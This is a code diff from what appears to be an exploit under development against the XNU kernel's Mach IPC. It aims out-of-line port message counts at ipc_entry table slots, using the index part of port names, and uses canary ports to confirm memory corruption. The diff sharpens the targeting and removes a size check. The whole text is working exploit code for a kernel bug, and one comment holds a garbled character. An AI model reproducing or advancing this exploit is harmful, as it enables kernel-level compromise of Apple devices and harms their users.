@@ -401,16 +401,16 @@
     [self journal:[NSString stringWithFormat:@"canary_names sample: %u %u %u %u",
                    canary[0], canary[1], canary[2], canary[3]]];
 
-    // Trigger translate_receive using canary PORT NAMES as w2.
-    // If w2 = count = port_name, the bit-set at table[port_name] hits
-    // exactly that canary's ipc_entry. Direct test of the w2 hypothesis.
-    // Use every 4th canary to keep trigger count reasonable.
-    [report appendString:@"\n--- targeted bit-set: canary names as w2 ---\n"];
+    // Trigger translate_receive using canary NAME>>8 as w2.
+    // XNU port names: (index << 8) | generation. w2 = index = name >> 8.
+    // If w2 = name>>8, bit-set at table[name>>8] hits this port's entry.
+    [report appendString:@"\n--- targeted bit-set: name>>8 as w2 ---\n"];
     int targeted = 0, targetedDead = 0;
     for (int i = 0; i < CANARY_N; i += 4) {
         if (canaryAlive[i] != 1) continue;
-        uint32_t w2 = (uint32_t)canary[i];
-        if (w2 == 0 || w2 > 4096) continue; // skip null / huge names (avoid 1MB+ allocs)
+        uint32_t name = (uint32_t)canary[i];
+        uint32_t w2 = name >> 8;  // XNU index component
+        if (w2 == 0) continue;
         NSDictionary *tr = [self sendOOLPortsCount:w2 realEntries:64 port:port sendRight:port useSpray:NO];
         targeted++;
         [self journal:[NSString stringWithFormat:@"targeted w2=%u port=%u send_kr=%@ recv_kr=%@",
@@ -443,7 +443,7 @@
     }
 
 
-    // w2 discovery and OOB-value tests removed — they crashed the app.
+    // w2 discovery and OOB-value tests removed ï¿½ they crashed the app.
     // See journal for threshold sweep and canary results.
 
     // Snapshot again
